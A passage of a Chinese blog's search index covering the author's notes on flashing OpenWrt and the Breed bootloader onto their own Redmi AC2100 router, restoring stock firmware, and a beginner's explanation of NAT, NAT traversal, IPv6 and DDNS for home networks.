shell","text":"<p>\u65b9\u6848\u6765\u6e90\u8005\u6211\u6ca1\u6709\u627e\u5230\uff0c\u8c8c\u4f3c\u90fd\u662f\u6700\u5148\u5728\u6069\u5c71\u8bba\u575b\u4e0a\u63d0\u51fa\u7684\u3002</p> <ol> <li> <p>telnet \u65b9\u6848</p> <p>\u6bd4\u8f83\u9ebb\u70e6\uff0c\u4e0d\u63d0\u3002</p> </li> <li> <p>ssh \u65b9\u6848</p> <ul> <li>\u539f\u521b\uff1a[0825:AC2100 \u65b0\u56fa\u4ef6\u6709\u6548 AX6 \u65e0\u6548]AX3600/AX1800/AX5/AC2100\u5b98\u65b9\u56fa\u4ef6\u5f00\u542fSSH\u65b9\u6cd5[\u539f\u521b] - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</li> </ul> <ul> <li>openwrt wiki \u6559\u7a0b\u4e2d\uff0c\u63d0\u4f9b\u4e86\u4e00\u4e2a JavaScript \u811a\u672c\u53ef\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u8fd0\u884c\uff0c\u4e0d\u5fc5\u624b\u52a8\u590d\u5236 Stock \u4ee3\u7801\u3002[OpenWrt Wiki] Xiaomi Redmi Router AC2100</li> </ul> <p>\u6709\u7684\u5e16\u5b50\u8bf4\u6709\u6f0f\u6d1e\u7684\u5b98\u65b9\u56fa\u4ef6\u7248\u672c\u662f 2.0.7 \u7248\u672c\uff0c\u4f46\u6211\u5b9e\u6d4b 2.0.23 \u7248\u672c (2021-06-22 \u65f6\u7684\u6700\u65b0\u7248) \u662f\u53ef\u4ee5\u7528\u7684\uff0copenwrt wiki \u4e0a\u4e5f\u8981\u6c42 2.0.23 \u7248\u672c\u3002</p> </li> </ol>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u4ece\u5b98\u65b9\u5237-openwrt","title":"\u4ece\u5b98\u65b9\u5237 openwrt","text":"<pre><code>mtd write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-kernel1.bin kernel1\nmtd -r write openwrt-ramips-mt7621-xiaomi_redmi-router-ac2100-squashfs-rootfs0.bin rootfs0 #-r\u53c2\u6570\u8868\u793a\u5b8c\u6210\u540e\u91cd\u542f\n</code></pre> <p>kernel \u6309\u7167\u539f\u5382 bootloader \u6240\u8981\u6c42\u7684\u65b9\u5f0f\u6dfb\u52a0\u5230\u955c\u50cf\u4e2d\uff0c\u56e0\u6b64\u53ef\u4ee5\u4fdd\u7559\u539f\u5382\u7684 bootloader\uff08\u89c1[OpenWrt Wiki] Overview\uff09</p> <p>\uff08\u8bf4\u660e\u8def\u7531\u5668\u8fd9\u79cd\u8bbe\u5907\uff0c\u5f15\u5bfc\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u662f\u7ed1\u5b9a\u5728\u4e00\u8d77\u7684\uff09</p> <p>Also the kernel is handled like a package, but is added to the firmware image in the special way each device's bootloader expects it, so you can replace the stock firmware without touching the bootloader itself (that is dangerous and not always possible).</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u5237-breed","title":"\u5237 breed","text":"<p>\u7ea2\u7c73/\u5c0f\u7c73 AC2100 \u5237\u5165 r3g breed \u4ee5\u53ca\u6062\u590d\u5b98\u65b9 boot \u8be6\u7ec6\u6559\u7a0b\uff08\u66f4\u65b0\u67e5\u574f\u5757\u65b9\u6cd5\u3001pb-boot\uff09 - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <ol> <li>\u8fdb\u5165 shell \u540e\uff0c<code>cat /proc/mtd</code>\u67e5\u770b flash \u5206\u533a</li> <li>\u4e0a\u4f20 breed \u5e76\u8fd0\u884c<code>mtd -r write /tmp/breed-mt7621-xiaomi-r3g.bin Bootloader</code></li> </ol>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u4ece-breed-\u5237-openwrt","title":"\u4ece breed \u5237 openwrt","text":"<p>[2020-08-29 \u66f4\u65b0] \u6559\u7a0b\uff1a\u5c0f\u7c73\u548c\u7ea2\u7c73 AC2100 \u7528 breed \u5237 openwrt - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p> <ol> <li>\u8fdb breed \u7684\u73af\u5883\u53d8\u91cf\u7f16\u7f09\u83dc\u5355\uff0c\u65b0\u589e\u5b57\u6bb5 xiaomi.r3g.bootfw \u503c\u4e3a 2</li> <li>\u4e0b\u8f7d\u4e34\u65f6\u56fa\u4ef6\u5237\u5165\u8def\u7531\u5668\u5e76\u91cd\u542f</li> <li>\u8fdb\u5165 openwrt \u66f4\u65b0\u7cfb\u7edf\u56fa\u4ef6\uff0c\u4e0d\u8981\u52fe\u9009 \u4fdd\u7559\u914d\u7f6e\u9009\u9879</li> </ol>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u6062\u590d\u5230\u5b98\u65b9","title":"\u6062\u590d\u5230\u5b98\u65b9","text":"<ol> <li> <p>\u6062\u590d\u5b98\u65b9 Bootloader</p> <ul> <li>\u901a\u8fc7 breed \u66f4\u65b0 Bootloader</li> <li>\u8fdb\u5165 shell \u6267\u884c mtd write \u547d\u4ee4</li> </ul> </li> <li> <p>\u4f7f\u7528\u5b98\u65b9\u4fee\u590d\u5de5\u5177</p> <p>\u3010\u5c0f\u7c73\u8def\u7531\u5668\u4fee\u590d\u5de5\u5177\u3011\u4f7f\u7528\u8bf4\u660e\u548c\u5237\u673a\u6559\u7a0b - \u5c0f\u7c73\u793e\u533a (xiaomi.cn)</p> </li> </ol> <p>\u8bb0\u5f55\uff1a</p> <p>\u9996\u5148\u4f7f\u7528 breed \u76f4\u63a5\u5237\u4e86\u5c0f\u7c73\u5b98\u65b9 bootloader\uff08\u6709\u4e9b\u5730\u65b9\u8bf4\u4e0d\u884c\uff0c\u6700\u597d\u624b\u52a8\u4f7f\u7528 mtd write \u547d\u4ee4\uff09\uff0c\u7136\u540e\u4f7f\u7528\u5b98\u65b9\u4fee\u590d\u5de5\u5177\u6062\u590d\u5b98\u65b9\u56fa\u4ef6</p> <p>\u5751\uff1a</p> <ul> <li>\u8fd0\u884c\u5b98\u65b9\u4fee\u590d\u5de5\u5177\u9700\u8981\u5173\u95ed windows \u5373\u65f6\u6740\u6bd2</li> <li>\u6700\u597d\u7981\u7528\u4e00\u4e9b\u7f51\u5361\u514d\u5f97\u9009\u62e9\u9519\u8bef</li> <li>\u5931\u8d25\u4e86\u4e09\u56db\u6b21\uff0c\u6362\u7528\u4e0d\u540c\u5730\u65b9\u4e0b\u8f7d\u7684\u5b98\u65b9\u56fa\u4ef6\u6700\u540e\u89e3\u51b3\u4e86\uff08\u6700\u540e\u7528\u7684\u672c\u76ee\u5f55\u7684 2.0.23.bin\uff09</li> <li>\u5b9e\u6d4b\u5199\u5b98\u65b9\u56fa\u4ef6\u4e0d\u5230 1 \u5206\u949f\uff0c\u4e0d\u5fc5\u7b49\u592a\u957f</li> </ul>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u5176\u5b83\u65b9\u5f0f","title":"\u5176\u5b83\u65b9\u5f0f","text":"<p>\u9002\u7528\u4e8e breed \u7684\u4fee\u6539\u7248\u5b98\u65b9\u56fa\u4ef6</p> <p>[2020 \u5e74 11 \u6708 28 \u65e5\u66f4\u65b0]breed \u5237\u673a\u7ea2\u7c73 AC2100 \u5c0f\u7c73 AC2100 \u539f\u5382\u56fa\u4ef6\u5b98\u65b9\u56fa\u4ef6 - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/13/2022-02-13-%E8%AE%B0%E5%BD%95%E7%BA%A2%E7%B1%B3AC2100%E6%8A%98%E8%85%BE/#\u5176\u5b83\u53c2\u8003","title":"\u5176\u5b83\u53c2\u8003","text":"<p>\u6069\u5c71\u7684\u8fd9\u4e2a\u5e16\u5b50\u9002\u5408\u5c0f\u767d\uff1a\u7ea2\u7c73 (\u5c0f\u7c73)AC2100 \u65e0\u9700 Telnet \u5237\u5165 Breed \u548c Padavan \u56fa\u4ef6\u6559\u7a0b - \u5c0f\u7c73\u65e0\u7ebf\u8def\u7531\u5668\u4ee5\u53ca\u5c0f\u7c73\u65e0\u7ebf\u76f8\u5173\u7684\u8bbe\u5907 - \u6069\u5c71\u65e0\u7ebf\u8bba\u575b - Powered by Discuz! (right.com.cn)</p>","tags":["ac2100"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/","title":"\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531","text":"","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531-","title":"\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531:-)","text":"<p>\u8fd9\u91cc\u8bf4\u7684\u7f51\u7edc\u81ea\u7531\uff0c\u662f\u6307\u901a\u8fc7\u7f51\u7edc\u5de5\u5177\u6781\u5927\u5730\u4fbf\u5229\u751f\u6d3b\u7684\u67d0\u4e9b\u65b9\u9762\u3002\u8fd9\u7bc7\u6587\u7ae0\u662f\u6211\u81ea\u5df1\u5bf9\u6298\u817e\u8def\u7531\u5668\u5237\u673a\u3001openwrt\u3001ipv6 \u7684\u603b\u7ed3\uff0c\u5e76\u5c3d\u91cf\u8bf4\u660e\u4e86\u5404\u79cd\u73a9\u6cd5\u7684\u5b9e\u9645\u7528\u9014\u3002\u5176\u4e2d\u6709\u4e9b\u64cd\u4f5c\u786e\u5b9e\u7ed9\u6211\u5e26\u6765\u4e86\u6781\u5927\u4fbf\u5229\uff0c\u6bd4\u5982\u5176\u4e2d\u4f7f\u7528 iSCSI \u901a\u8fc7\u7f51\u7edc\u6302\u8f7d\u5176\u5b83\u8bbe\u5907\u7684\u786c\u76d8\uff0c\u8fd9\u5145\u5206\u89e3\u653e\u4e86\u6211\u53ea\u6709 500GB \u7684\u8f7b\u8584\u672c\u3002\u5728\u4e0a\u9762\u5b89\u88c5\u6e38\u620f\u540e\uff0c\u53c8\u53ef\u4ee5\u5b9e\u73b0\u5728\u4e0d\u540c\u8bbe\u5907\u4e0a\u65e0\u7f1d\u73a9\u540c\u4e00\u4e2a\u6e38\u620f\u7684\u4f53\u9a8c\u3002</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u57fa\u7840\u77e5\u8bc6","title":"\u57fa\u7840\u77e5\u8bc6","text":"<ul> <li> <p>\u5149\u7ea4\u5bbd\u5e26\u4e0a\u7f51</p> <p>\u5bf9\u4e8e\u5149\u7ea4\u63a5\u5165\u7684\u5bbd\u5e26\uff0c\u4f1a\u6709\u4e00\u4e2a\u8bbe\u5907\u53eb\u505a\u5149\u732b\uff08\u732b\uff0cmodem\uff0c\u8c03\u5236\u89e3\u8c03\u5668\uff09\uff0c\u7528\u4e8e\u5c06\u5149\u4fe1\u53f7\u8f6c\u6362\u4e3a\u7535\u4fe1\u53f7\u3002\u5149\u732b\u540e\u9762\u9664\u4e86\u5149\u7ea4\u63a5\u5165\uff0c\u8fd8\u6709\u4e00\u6392 LAN \u53e3\u4f5c\u4e3a\u8f93\u51fa\u3002\u6211\u4eec\u4f1a\u5c06\u5176\u4e2d\u4e00\u4e2a LAN \u53e3\u8fde\u63a5\u5230\u81ea\u5df1\u4e70\u7684\u8def\u7531\u5668\u80cc\u540e\u7684 WAN \u53e3\u4e0a\uff08\u53ea\u6709\u4e00\u4e2a\uff0c\u5e76\u4e14\u4e00\u822c\u989c\u8272\u4e0d\u4e00\u6837\uff09</p> <p>\u6b64\u65f6\u6709\u4e24\u79cd\u914d\u7f6e\u65b9\u6cd5\u53ef\u4ee5\u4e0a\u7f51\uff1a</p> <ul> <li> <p>\u5149\u732b\u4e2d\u8bbe\u7f6e\u62e8\u53f7\u4e0a\u7f51\uff0c\u8def\u7531\u5668 WAN \u8bbe\u7f6e\u4e3a DHCP \u534f\u8bae</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\u88c5\u5bbd\u5e26\u7684\u5e08\u5085\u4f1a\u8bbe\u7f6e\u6210\u8fd9\u79cd\u65b9\u5f0f\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b\u5149\u732b\u4e5f\u76f8\u4f5c\u4e3a\u4e00\u4e2a\u8def\u7531\u5668\uff0c\u81ea\u5df1\u4e70\u7684\u8def\u7531\u5668\u5219\u76f8\u5f53\u4e8e\u4e00\u4e2a\u4e8c\u7ea7\u8def\u7531\u5668</p> <p>ps. \u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5149\u732b\u548c\u8def\u7531\u5668\u5904\u4e8e\u4e24\u4e2a\u4e0d\u540c\u7684\u7f51\u6bb5 (\u5c40\u57df\u7f51)\uff0c\u4e2d\u95f4\u7ecf\u8fc7\u4e00\u5c42 NAT\uff0c\u6bd4\u5982\u5149\u732b\u4e3a 192.168.0.1\uff0c\u8def\u7531\u5668\u4e3a 192.168.1.1</p> <p>ps. \u5149\u732b\u4e2d\u4e00\u822c\u4e5f\u53ef\u4ee5\u5f00\u542f\u4e00\u4e2a\u65e0\u7ebf\u7f51\u7edc\uff0c\u540d\u5b57\u662f\u56fa\u5b9a\u7684\u3002\u56e0\u6b64\u751a\u81f3\u53ef\u4ee5\u4e0d\u7528\u8def\u7531\u5668\u800c\u53ea\u4f7f\u7528\u5149\u732b</p> <p>ps. \u5b58\u5728\u6027\u80fd\u95ee\u9898\uff1a\u4e00\u822c\u6765\u8bf4\uff0c\u5149\u732b\u7684\u786c\u4ef6\u914d\u7f6e\u76f8\u5bf9\u4e8e\u81ea\u5df1\u4e70\u7684\u8def\u7531\u5668\u90fd\u6bd4\u8f83\u4f4e\uff0c\u4f5c\u4e3a\u8def\u7531\u5668\u7684\u8bdd\u53ef\u80fd\u9020\u6210\u6027\u80fd\u74f6\u9888\uff0c\u56e0\u6b64\u66f4\u63a8\u8350\u4e0b\u9762\u7684\u914d\u7f6e\u65b9\u5f0f</p> </li> </ul> <ul> <li> <p>\u5149\u732b\u8bbe\u7f6e\u4e3a\u6865\u63a5\u6a21\u5f0f\uff0c\u8def\u7531\u5668 WAN \u8bbe\u7f6e\u4e3a\u62e8\u53f7\u4e0a\u7f51</p> <p>\u8fd9\u79cd\u65b9\u5f0f\uff0c\u5149\u732b\u53ea\u4f5c\u4e3a\u4e00\u4e2a\u5149\u7535\u8f6c\u6362\u8bbe\u5907\uff0c\u8def\u7531\u5668\u8d1f\u8d23\u8def\u7531\u3001\u8f6c\u53d1\u3002\u56e0\u6b64\u5149\u732b\u4e0d\u4f1a\u9020\u6210\u6027\u80fd\u74f6\u9888\u3002</p> </li> </ul> </li> </ul> <ul> <li> <p>\u516c\u7f51 ip</p> <ul> <li>\u8ba1\u7b97\u673a\u4e4b\u95f4\u8981\u60f3\u76f8\u4e92\u901a\u4fe1\uff0c\u9700\u8981\u4f7f\u7528 ip \u5730\u5740\u6765\u8fdb\u884c\u6807\u8bc6\u3002\u5982\u679c\u6bcf\u53f0\u8ba1\u7b97\u673a\u7684 ip \u90fd\u4e0d\u540c\uff0c\u90a3\u4e48\u60c5\u51b5\u6700\u7b80\u5355\u3002\u8fd9\u79cd ip \u79f0\u4e3a\u516c\u7f51 ip</li> </ul> <ul> <li> <p>\u4f46\u662f\u7531\u4e8e ipv4 \u6570\u91cf\u6709\u9650\uff0c\u65e0\u6cd5\u7ed9\u6bcf\u53f0\u8ba1\u7b97\u673a\u90fd\u5206\u914d\u4e00\u4e2a\u552f\u4e00\u7684 ip\uff0c\u56e0\u6b64\u4ea7\u751f\u4e86 NAT \u6280\u672f\u3002\u5927\u81f4\u8fc7\u7a0b\uff1a\u8fde\u63a5\u5230\u540c\u4e00\u4e2a\u8def\u7531\u5668\u4e0a\u7684\u8bbe\u5907\uff08\u5373\u4e00\u4e2a\u5c40\u57df\u7f51\uff09\u88ab\u5206\u914d\u7ed9\u4e00\u4e2a\u5185\u7f51\u5730\u5740\u3002\u5f53\u5176\u4e2d\u67d0\u4e2a\u8bbe\u5907\u4e0a\u7f51\u65f6\uff08\u5982\u8bbf\u95ee B \u7ad9\uff09\uff0c\u8def\u7531\u5668\u8f6c\u53d1\u8be5\u8bbe\u5907\u7684\u7f51\u7edc\u5305\uff0c\u5e76\u5c06\u5176\u4e2d\u7684 ip \u8f6c\u6362\u6210\u81ea\u5df1\u7684\u516c\u7f51 ip\u3002\u4e4b\u540e\u5f53\u8def\u7531\u5668\u63a5\u6536\u5230 B \u7ad9\u670d\u52a1\u5668\u7684\u54cd\u5e94\u65f6\uff0c\u540c\u6837\u5c06\u7f51\u7edc\u5305\u4e2d ip \u8f6c\u6362\u56de\u8bbe\u5907\u7684\u5185\u7f51 ip\u3002</p> <p>\u56e0\u6b64\uff0c\u6574\u4e2a\u8fc7\u7a0b\u4e2d\uff0cB \u7ad9\u7684\u670d\u52a1\u5668\u8ba4\u4e3a\u5728\u548c\u8def\u7531\u5668\u8fdb\u884c\u901a\u4fe1\u3002</p> </li> </ul> <ul> <li>NAT \u4f7f\u5f97\u4e00\u4e2a\u5c40\u57df\u7f51\u5185\u7684\u8bbe\u5907\u5171\u7528\u4e00\u4e2a\u516c\u7f51 ip \u4e0a\u7f51\uff0c\u751a\u81f3\u8fd8\u53ef\u4ee5\u591a\u5c42 NAT \u5957\u5a03\uff0c\u5927\u5927\u8282\u7ea6\u4e86 ip \u5730\u5740\u3002\u4f46\u662f\u540c\u65f6\u4e5f\u4f7f\u5f97\u5c40\u57df\u7f51\u5916\u7684\u8bbe\u5907\u65e0\u6cd5\u8bbf\u95ee\u5c40\u57df\u7f51\u5185\u7684\u8bbe\u5907\uff0c\u5e26\u6765\u4e86\u9700\u8981\u5185\u7f51\u7a7f\u900f\u7684\u95ee\u9898\u3002</li> </ul> <ul> <li>\u76ee\u524d\u5bb6\u7528\u5bbd\u5e26\uff0c\u5206\u914d\u7684 ip \u57fa\u672c\u662f\u5185\u7f51 ip\uff0c\u4e0a\u7f51\u65f6\u9700\u8981\u7ecf\u8fc7\u8fd0\u8425\u5546\u8def\u7531\u5668\u7684 NAT \u8f6c\u6362\u3002</li> </ul> <ul> <li>\u4f46\u662f\uff01\u968f\u7740 ipv6 \u7684\u666e\u53ca\uff0c\u76ee\u524d\u5bb6\u7528\u5bbd\u5e26\u5747\u53ef\u4ee5\u83b7\u5f97\u516c\u7f51\u7684 ipv6 \u5730\u5740\uff01\u6709\u4e86 ipv6 \u540e\uff0c\u6bcf\u4e2a\u8bbe\u5907\u90fd\u53ef\u4ee5\u83b7\u5f97\u552f\u4e00\u7684 ipv6 \u5730\u5740\uff0c\u4e07\u7269\u5747\u53ef\u4e92\u8054\uff0c\u7ec8\u4e8e\u56de\u5f52\u5230\u4e86\u4e92\u8054\u7f51\u672c\u6765\u7684\u6837\u5b50\uff01</li> </ul> </li> </ul> <ul> <li> <p>\u5185\u7f51\u7a7f\u900f</p> <p>\u4f7f\u5f97\u5c40\u57df\u7f51\u5916\u7684\u8bbe\u5907\u8bbf\u95ee\u5c40\u57df\u7f51\u5185\u7684\u8bbe\u5907\u4fbf\u53eb\u505a\u5185\u7f51\u7a7f\u900f\u3002\u5185\u7f51\u7a7f\u900f\u5f88\u590d\u6742\uff0c\u51b5\u4e14\u6709\u4e86 ipv6 \u540e\u4fbf\u53ef\u4ee5\u628a\u8fd9\u4e9b\u90fd\u4e22\u6389\u4e86\uff0c\u56e0\u6b64\u8fd9\u91cc\u4ec5\u7b80\u5355\u8bf4\u660e\u4e00\u4e0b\u5e38\u89c1\u7684\u5185\u7f51\u7a7f\u900f\u65b9\u5f0f\uff1a</p> <ul> <li> <p>\u6700\u7b80\u5355\u7684\u60c5\u51b5\uff0c\u4f7f\u7528\u4e00\u4e2a\u516c\u7f51\u670d\u52a1\u5668\u4f5c\u4e3a\u8df3\u677f\u3002\u8bbe\u5907 A \u8981\u60f3\u8bbf\u95ee\u5185\u7f51\u4e2d\u7684\u8bbe\u5907 B\uff0c\u5148\u8bbf\u95ee\u670d\u52a1\u5668 C\uff0cC \u518d\u5c06\u6570\u636e\u8f6c\u53d1\u7ed9 B\u3002</p> <p>\u7f3a\u70b9\uff1a\u8fd9\u79cd\u65b9\u5f0f A \u8bbf\u95ee B \u7684\u5e26\u5bbd\u53d7\u9650\u4e8e\u8d2d\u4e70\u7684\u670d\u52a1\u5668 C \u7684\u4e0a\u4f20\u4e0b\u8f7d\u5e26\u5bbd\u3002\u4e00\u822c\u7684\u670d\u52a1\u5668\u53ef\u80fd\u53ea\u6709 1~2M \u7684\u5e26\u5bbd\uff0c\u5f88\u5c0f\u3002</p> <p>ps. \u4f7f\u7528\u8fc7\u7684\u5de5\u5177\u6709 Frp</p> </li> </ul> <ul> <li> <p>udp \u6253\u6d1e\uff0c\u8fd9\u79cd\u6bd4\u8f83\u9ad8\u7ea7\uff0c\u6d89\u53ca\u5230 NAT \u7684\u539f\u7406\u3002\u91c7\u7528\u8fd9\u79cd\u65b9\u5f0f\u9700\u8981\u5176\u4e2d\u4e00\u4e2a\u8bbe\u5907\u6709\u516c\u7f51 ip\u3002\u6ca1\u6709\u7684\u8bdd\uff0c\u5219\u9700\u8981\u670d\u52a1\u5668 C \u8fdb\u884c\u521d\u59cb\u5316\u8fde\u63a5\uff0c\u6253\u6d1e\u6210\u529f\u540e\uff0cA \u76f4\u63a5\u8bbf\u95ee B \u4e0d\u9700\u8981 C \u7684\u8f6c\u53d1\uff0c\u56e0\u6b64\u8bbf\u95ee\u5e26\u5bbd\u4e0d\u4f1a\u88ab C \u7684\u5e26\u5bbd\u9650\u5236</p> <p>\u7f3a\u70b9\uff1audp \u6253\u6d1e\u5bf9 NAT \u7c7b\u578b\u6709\u8981\u6c42\uff0c\u5e76\u975e\u6240\u6709 NAT \u7c7b\u578b\u90fd\u80fd\u6253\u6d1e\u6210\u529f</p> <p>ps. \u8bb8\u591a P2P \u5de5\u5177\uff0c\u8054\u673a\u6e38\u620f\uff0c\u90fd\u4f1a\u4f7f\u7528\u8be5\u6280\u672f</p> </li> </ul> <p>\u8fd9\u91cc\u68b3\u7406\u4e86\u4e00\u4e0b\u4e0d\u540c\u7f51\u7edc\u60c5\u51b5\u4e0b\u5185\u7f51\u7a7f\u900f\u65b9\u5f0f{% post_link \u4e0d\u540c\u60c5\u51b5\u4e0b\u7684\u5185\u7f51\u7a7f\u900f %}</p> </li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u57fa\u7840","title":"\u57fa\u7840","text":"<p>\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531\u7684\u57fa\u7840\u4fbf\u662f\u6bcf\u53f0\u8bbe\u5907\u90fd\u80fd\u83b7\u5f97\u4e00\u4e2a\u516c\u7f51\u7684 ip\uff0cipv6 \u4f7f\u6211\u4eec\u80fd\u505a\u5230\u8fd9\u4e00\u70b9</p>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#\u5f00\u542f-ipv6","title":"\u5f00\u542f ipv6","text":"<ul> <li>\u5bf9\u4e8e\u5bb6\u91cc\u63a5\u5165\u4e86\u5bbd\u5e26\u7684\u60c5\u51b5\uff0c\u5404\u5927\u8fd0\u8425\u5546\u57fa\u672c\u90fd\u652f\u6301 ipv6\uff0c\u4f46\u4e0d\u4e00\u5b9a\u5f00\u542f\u4e86\u3002\u9700\u8981\u5728\u5149\u732b\u91cc\u8bbe\u7f6e<ul> <li>\u79fb\u52a8\u5149\u732b\u5f00\u542f ipv6 \u6559\u7a0b{% post_link \u79fb\u52a8\u5149\u732b\u5f00\u542f ipv6 %}</li> </ul> </li> <li>\u5bf9\u4e8e\u5b66\u6821\u8fde\u63a5\u6821\u56ed\u7f51\u7684\u60c5\u51b5\uff0c\u6821\u56ed\u7f51\u9664\u4e86\u63a5\u5165\u51e0\u5927\u8fd0\u8425\u5546\uff0c\u8fd8\u53ef\u80fd\u63a5\u5165\u6559\u80b2\u7f51\uff0c\u4e00\u822c\u90fd\u652f\u6301 ipv6\u3002\u6b64\u65f6\u5728\u8def\u7531\u5668\u76f8\u5173\u9009\u9879\u91cc\u6253\u5f00 ipv6 \u5373\u53ef\u3002</li> <li>\u5bf9\u4e8e\u8def\u7531\u5668\u4e3a openwrt \u7684\u60c5\u51b5\uff0c\u914d\u7f6e ipv6 \u6559\u7a0bopenwrt \u914d\u7f6e#ipv6</li> </ul>","tags":["\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/02/14/2022-02-14-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E8%87%AA%E7%94%B1/#ddns","title":"DDNS","text":"<p>\u867d\u7136 ipv6 \u662f\u5f97\u6bcf\u4e2a\u8bbe\u5907\u6709\u4e86\u516c\u7f51 ip\uff0c\u4f46\u662f\u6709\u4e24\u4e2a\u95ee\u9898\uff1a</p> <ul> <li>\u76ee\u524d ipv6 \u6709\u6709\u72b6\u6001\u7684\u5206\u914d\u534f\u8bae DHCP\uff0c\u4e5f\u6709\u65e0\u72b6\u6001\u7684 SLAAC \u534f\u8bae\uff0c\u5206\u914d\u7684 ip \u5730\u5740\u53ef\u80fd\u53d1\u751f\u53d8\u5316\u3002</li> <li>ipv6 \u5730\u5740\u6709 128bit\uff0c\u592a\u957f\u4e86\u4e0d\u5bb9\u6613\u8bb0\u5fc6</li> </ul> <p>\u89e3\u51b3\u4ee5\u4e0a\u95ee\u9898\u7684\u65b9\u5f0f\u4fbf\u662f\u5c06 ipv6 \u7ed1\u5b9a\u5230\u4e00\u4e2a\u57df\u540d\u4e0a\u3002</p> <p>FreeDNS \u548c openwrt \u914d\u7f6e\u4ecb\u7ecdopenwrt 